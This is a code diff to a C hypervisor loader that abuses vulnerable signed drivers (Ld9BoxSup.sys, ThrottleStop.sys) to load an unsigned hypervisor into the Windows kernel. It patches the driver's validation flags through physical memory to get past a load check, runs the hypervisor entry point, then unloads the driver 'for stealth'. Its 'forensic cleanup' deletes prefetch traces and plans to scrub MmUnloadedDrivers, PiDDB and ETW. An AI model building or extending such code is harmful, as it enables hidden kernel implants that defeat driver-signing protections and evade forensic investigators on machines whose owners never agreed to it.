@@ -3,7 +3,10 @@
 
 #include "hv_loader.h"
 #include "pe_utils.h"
+#include "cleanup.h"
 #include "../byovd/supdrv.h"
+#include "../byovd/throttlestop.h"
+#include "../byovd/nt_defs.h"
 #include <stdio.h>
 #include <stdlib.h>
 #include <string.h>
@@ -111,6 +114,14 @@ static BOOL AllocateHypervisorMemory(HV_LOADER_CTX* ctx) {
     printf("[+] Params page @ R0=0x%p, Phys=0x%llX\n",
            mem->ParamsPage.R0, mem->ParamsPage.Physical);
 
+    // Blank page for self-protection
+    if (DrvAllocContiguous(drv, 1, &mem->BlankPage) != DRV_SUCCESS) {
+        printf("[-] Failed to allocate blank page\n");
+        return FALSE;
+    }
+    printf("[+] Blank page @ R0=0x%p, Phys=0x%llX\n",
+           mem->BlankPage.R0, mem->BlankPage.Physical);
+
     // Debug buffer
     if (DrvAllocPages(drv, DEBUG_BUFFER_PAGES, TRUE, &mem->DebugBuffer) != DRV_SUCCESS) {
         printf("[-] Failed to allocate debug buffer\n");
@@ -132,6 +143,7 @@ static void FreeHypervisorMemory(HV_LOADER_CTX* ctx) {
     if (mem->MsrBitmap.R3)     DrvFreeContiguous(drv, &mem->MsrBitmap);
     if (mem->EptTables.R3)     DrvFreeContiguous(drv, &mem->EptTables);
     if (mem->ParamsPage.R3)    DrvFreeContiguous(drv, &mem->ParamsPage);
+    if (mem->BlankPage.R3)     DrvFreeContiguous(drv, &mem->BlankPage);
     if (mem->DebugBuffer.R3)   DrvFreePages(drv, &mem->DebugBuffer);
 
     memset(mem, 0, sizeof(*mem));
@@ -176,6 +188,9 @@ static void PrepareVmxStructures(HV_LOADER_CTX* ctx) {
 
     // Zero params page
     memset(mem->ParamsPage.R3, 0, 0x1000);
+
+    // Zero blank page (for self-protection)
+    memset(mem->BlankPage.R3, 0, 0x1000);
 }
 
 // =============================================================================
@@ -240,6 +255,11 @@ static void BuildInitParams(HV_LOADER_CTX* ctx, KERNEL_SYMBOLS* syms) {
     // VMCALL key (generate random or use fixed for now)
     params->VmcallKey = 0xDEADBEEFCAFEBABE;  // TODO: randomize
 
+    // Self-protection (populated after module load)
+    params->HvPhysBase = 0;
+    params->HvPhysSize = 0;
+    params->BlankPagePhys = 0;
+
     params->Flags = 0;
     params->Reserved = 0;
 
@@ -294,17 +314,101 @@ static BOOL PatchBootstrapSection(void* hvImage, U32 hvImageSize, U64 paramsR0) 
 }
 
 // =============================================================================
+// Populate Self-Protection Fields
+// =============================================================================
+
+// Assembly stub to call MmGetPhysicalAddress in kernel
+// This returns the PHYSICAL_ADDRESS structure (U64) for a given virtual address
+static const U8 GetPhysAddrStub[] = {
+    // MmGetPhysicalAddress stub (position-independent)
+    // void* MmGetPhysicalAddress(void* va)
+    // Input: RCX = virtual address
+    // Output: RAX = physical address
+    // We need to resolve MmGetPhysicalAddress dynamically via symbol lookup
+
+    // For now, we'll use a different approach:
+    // Since we have contiguous allocations, they already provide Physical addresses
+    // The hypervisor loaded via LDR_OPEN doesn't give us physical address directly
+
+    0xC3  // ret (stub - will use different approach)
+};
+
+static BOOL PopulateSelfProtection(HV_LOADER_CTX* ctx) {
+    HV_MEMORY_LAYOUT* mem = &ctx->Memory;
+    HV_INIT_PARAMS* params = (HV_INIT_PARAMS*)mem->ParamsPage.R3;
+
+    // We can't easily get the physical address of the LDR_OPEN allocation
+    // without kernel execution. For now, we'll leave these as 0 and the
+    // hypervisor will need to resolve them during initialization using
+    // MmGetPhysicalAddress from kernel context.
+
+    // However, we CAN populate the blank page physical address since
+    // it was allocated with DrvAllocContiguous which gives us the physical address
+    params->BlankPagePhys = mem->BlankPage.Physical;
+
+    // Store the virtual address and size so hypervisor can translate
+    // Note: ImageBase and ImageSize are kernel virtual addresses
+    params->HvPhysBase = 0;  // Hypervisor will resolve this via MmGetPhysicalAddress
+    params->HvPhysSize = ctx->ImageSize;
+
+    printf("[*] Self-protection populated:\n");
+    printf("    HvPhysBase: 0x%llX (will be resolved by HV)\n", params->HvPhysBase);
+    printf("    HvPhysSize: 0x%X\n", (U32)params->HvPhysSize);
+    printf("    BlankPagePhys: 0x%llX\n", params->BlankPagePhys);
+
+    return TRUE;
+}
+
+// =============================================================================
 // Load Hypervisor Module
 // =============================================================================
 
-static BOOL LoadHypervisorModule(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageSize) {
-    // Get entry point RVA
-    uint32_t entryRva;
-    if (!PeGetEntryPoint(hvImage, hvImageSize, &entryRva)) {
-        printf("[-] Failed to get entry point from PE\n");
-        return FALSE;
+static BOOL AllocateHypervisorImage(HV_LOADER_CTX* ctx, U32 hvImageSize) {
+    // =========================================================================
+    // -618 BYPASS: Patch Ld9BoxSup.sys validation flags via ThrottleStop
+    // =========================================================================
+    // The driver's LDR_OPEN checks module enumeration. On bare metal this can
+    // fail with -618 (VERR_LDR_GENERAL_FAILURE) if ntoskrnl/hal validation
+    // flags aren't set. We patch these flags via physical memory before calling
+    // LDR_OPEN to ensure success.
+    // =========================================================================
+
+    printf("[*] Applying -618 bypass via ThrottleStop...\n");
+
+    // Get Ld9BoxSup.sys base address
+    UINT64 ld9BoxBase = NtGetDriverBase(L"ld9box");
+    if (ld9BoxBase == 0) {
+        printf("[!] Warning: Could not find Ld9BoxSup.sys base address\n");
+        printf("    Proceeding without bypass - LDR_OPEN may fail with -618\n");
+    } else {
+        printf("[+] Ld9BoxSup.sys base: 0x%llX\n", ld9BoxBase);
+
+        // Initialize ThrottleStop context
+        TS_CTX tsCtx;
+        TS_Init(&tsCtx);
+
+        // Initialize ThrottleStop driver (NULL = use existing loaded driver)
+        if (TS_Initialize(&tsCtx, NULL)) {
+            printf("[+] ThrottleStop initialized\n");
+
+            // Patch the -618 validation flags
+            if (TS_Patch618Flags(&tsCtx, ld9BoxBase)) {
+                printf("[+] -618 bypass: Validation flags patched successfully\n");
+            } else {
+                printf("[!] -618 bypass: Failed to patch flags: %s\n", TS_GetLastError(&tsCtx));
+                printf("    LDR_OPEN may still succeed if already patched\n");
+            }
+
+            // Cleanup ThrottleStop driver (unload for stealth)
+            TS_Cleanup(&tsCtx);
+            printf("[+] ThrottleStop cleaned up\n");
+        } else {
+            printf("[!] ThrottleStop init failed: %s\n", TS_GetLastError(&tsCtx));
+            printf("    Proceeding without bypass - ensure ThrottleStop.sys is available\n");
+        }
     }
-    printf("[*] Entry point RVA: 0x%X\n", entryRva);
+
+    printf("[*] -618 bypass complete, proceeding with LDR_OPEN\n");
 
     // LDR_OPEN: request kernel memory for image
     void* imageBase = NULL;
@@ -318,15 +422,27 @@ static BOOL LoadHypervisorModule(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageS
     ctx->ImageBase = imageBase;
     ctx->ImageSize = hvImageSize;
 
+    return TRUE;
+}
+
+static BOOL ExecuteHypervisorEntry(HV_LOADER_CTX* ctx, void* hvImage, U32 hvImageSize) {
+    // Get entry point RVA
+    uint32_t entryRva;
+    if (!PeGetEntryPoint(hvImage, hvImageSize, &entryRva)) {
+        printf("[-] Failed to get entry point from PE\n");
+        return FALSE;
+    }
+    printf("[*] Entry point RVA: 0x%X\n", entryRva);
+
     // Calculate entry point kernel address
-    void* entryPoint = (U8*)imageBase + entryRva;
+    void* entryPoint = (U8*)ctx->ImageBase + entryRva;
     printf("[*] Entry point @ 0x%p\n", entryPoint);
 
     // LDR_LOAD: copy image and invoke entry point
-    status = DrvLdrLoad(&ctx->Driver, imageBase, hvImage, hvImageSize, entryPoint);
+    DRV_STATUS status = DrvLdrLoad(&ctx->Driver, ctx->ImageBase, hvImage, hvImageSize, entryPoint);
     if (status != DRV_SUCCESS) {
         printf("[-] LDR_LOAD failed: %s\n", DrvStatusString(status));
-        DrvLdrFree(&ctx->Driver, imageBase);
+        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
         ctx->ImageBase = NULL;
         return FALSE;
     }
@@ -393,18 +509,35 @@ BOOL HvLoaderLoad(HV_LOADER_CTX* ctx, const void* hvImage, U32 hvImageSize) {
     }
     memcpy(hvImageCopy, hvImage, hvImageSize);
 
-    // 6. Patch bootstrap section
-    printf("[*] Patching bootstrap section...\n");
-    U64 paramsR0 = (U64)ctx->Memory.ParamsPage.R0;
-    if (!PatchBootstrapSection(hvImageCopy, hvImageSize, paramsR0)) {
+    // 6. Allocate kernel memory for hypervisor
+    printf("[*] Allocating kernel memory for hypervisor...\n");
+    if (!AllocateHypervisorImage(ctx, hvImageSize)) {
         free(hvImageCopy);
         FreeHypervisorMemory(ctx);
         return FALSE;
     }
 
-    // 7. Load hypervisor module
-    printf("[*] Loading hypervisor module...\n");
-    if (!LoadHypervisorModule(ctx, hvImageCopy, hvImageSize)) {
+    // 7. Populate self-protection fields now that we have ImageBase
+    printf("[*] Populating self-protection fields...\n");
+    if (!PopulateSelfProtection(ctx)) {
+        printf("[-] Failed to populate self-protection fields\n");
+        // Not fatal - hypervisor will resolve during init
+    }
+
+    // 8. Patch bootstrap section
+    printf("[*] Patching bootstrap section...\n");
+    U64 paramsR0 = (U64)ctx->Memory.ParamsPage.R0;
+    if (!PatchBootstrapSection(hvImageCopy, hvImageSize, paramsR0)) {
+        free(hvImageCopy);
+        DrvLdrFree(&ctx->Driver, ctx->ImageBase);
+        ctx->ImageBase = NULL;
+        FreeHypervisorMemory(ctx);
+        return FALSE;
+    }
+
+    // 9. Execute hypervisor entry point
+    printf("[*] Executing hypervisor entry point...\n");
+    if (!ExecuteHypervisorEntry(ctx, hvImageCopy, hvImageSize)) {
         free(hvImageCopy);
         FreeHypervisorMemory(ctx);
         return FALSE;
@@ -416,6 +549,42 @@ BOOL HvLoaderLoad(HV_LOADER_CTX* ctx, const void* hvImage, U32 hvImageSize) {
     ctx->Running = TRUE;
 
     printf("[+] Hypervisor loaded successfully!\n");
+
+    // =========================================================================
+    // EPHEMERAL DRIVER UNLOAD
+    // =========================================================================
+    // The hypervisor is now running in VMX root mode and has its own physical
+    // memory access via EPT. The BYOVD driver (Ld9BoxSup.sys) is no longer
+    // needed - unload it immediately to reduce forensic footprint.
+    //
+    // Note: The kernel memory allocated via LDR_OPEN remains valid because
+    // it's NonPagedPool memory with no reference counting tied to the driver.
+    // The hypervisor protects its own pages via EPT self-protection.
+    // =========================================================================
+
+    printf("[*] Unloading BYOVD driver (ephemeral mode)...\n");
+
+    // Close device handle first (required before service stop)
+    if (ctx->Driver.hDevice) {
+        CloseHandle(ctx->Driver.hDevice);
+        ctx->Driver.hDevice = NULL;
+    }
+
+    // Unload the driver service
+    DRV_STATUS unloadStatus = DrvUnloadDriver(&ctx->Driver);
+    if (unloadStatus == DRV_SUCCESS) {
+        printf("[+] BYOVD driver unloaded successfully\n");
+    } else {
+        // Non-fatal - hypervisor still running, just leaves driver loaded
+        printf("[!] Warning: BYOVD driver unload failed (error %d)\n", unloadStatus);
+        printf("    Hypervisor is running but driver remains loaded\n");
+    }
+
+    // Perform usermode forensic cleanup (prefetch files, etc.)
+    // Kernel-side cleanup (MmUnloadedDrivers, PiDDB, ETW) requires VMCALL
+    printf("[*] Performing forensic cleanup...\n");
+    PerformForensicCleanup(FALSE);  // FALSE = no kernel cleanup available yet
+
     return TRUE;
 }
 
